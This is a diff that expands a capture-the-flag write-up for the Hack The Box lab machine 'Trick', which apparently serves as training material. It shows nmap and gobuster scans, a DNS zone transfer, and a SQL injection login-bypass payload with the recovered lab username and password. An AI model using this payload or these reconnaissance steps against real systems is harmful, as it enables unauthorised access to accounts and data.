@@ -3,6 +3,10 @@
 
 ### Vulnerabilities: sql injection, fail2ban
 
+Nmap reveals ssh, smtp, and http. I got sent down a rabbit hole with smtp.
+
+That means http is the answer! However even that site does not return much.
+
 ```console
 └──╼ [★]$ sudo nmap -sS -sC -sV -T4 10.129.51.233
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-02 22:47 BST
@@ -28,6 +32,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 244.80 seconds
 ```
+So if we dig the site that our IP is associated with then we can get back some good subdomains. Most notably is ```preprod-payroll.trick.htb```
 
 ```console
 └──╼ [★]$ dig axfr @10.129.51.233 trick.htb
@@ -54,9 +59,14 @@ Add the following to /etc/hosts on the last line
 10.129.51.233 trick.htb root.trick.htb preprod-payroll.trick.htb
 ```
 
-vulnerable to sql injection
+Navigating to prerod gives a login page that is vulnerable to sql injection.
+
+Note: Before I found this vulnerability I tried a couple of ways of getting passwords and usernames.
 
 ![image](https://user-images.githubusercontent.com/105310322/188241207-944c530d-e2d6-4be6-a5dc-aead955439a0.png)
+
+
+Running a gobuster gives us a couple of pages but the best one was users.php which revealed the user ```Enemigosss```
 
 ```console
 └──╼ [★]$ gobuster dir -u http://preprod-payroll.trick.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,db -q
@@ -76,15 +86,18 @@ vulnerable to sql injection
 /employee.php         (Status: 200) [Size: 2704]                                                
 /payroll.php          (Status: 200) [Size: 3142]                                                
 ```
-Gives username Enemigosss
-
 ![image](https://user-images.githubusercontent.com/105310322/188243435-1dcea327-7085-4041-a91f-c927b5264b8c.png)
 
-' OR ' 1=-- 
+So since I was not able to get and passwords I set my user to Enemigosss and inputted the following in the passwords section.
 
-Get us in and then navigate to users and change password. Password shown is SuperGucciRainbowCake
+```' OR ' 1=-- ``` note the space after =--
+
+This get us in and then we can navigate to users and change password. Password shown is SuperGucciRainbowCake.
+
+Note: The password did not do anything for me. This whole page was another rabbit hole.
 
 ![image](https://user-images.githubusercontent.com/105310322/188243610-f96f4f5a-2d41-4896-86dd-f7793cddf920.png)
+
 
 
 Add preprod-marketing.trick.htb to /etc/hosts
